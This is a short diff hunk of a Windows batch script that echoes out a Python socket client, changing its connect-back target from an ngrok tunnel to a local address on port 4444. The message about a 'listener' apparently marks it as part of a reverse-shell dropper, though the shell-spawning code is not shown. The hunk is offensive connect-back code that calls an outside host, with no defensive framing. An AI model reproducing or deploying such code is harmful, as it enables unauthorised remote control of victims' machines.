@@ -16,7 +16,7 @@ if not exist %FILE% (
         echo    s = socket.socket^(^)
         echo.
         echo    try:
-        echo        s.connect^(^('0.tcp.eu.ngrok.io', 15460^)^)
+        echo        s.connect^(^('192.168.1.16', 4444^)^)
         echo    except ConnectionRefusedError as e:
         echo        print^('refused ... Check if listener is running.'^)
         echo        return
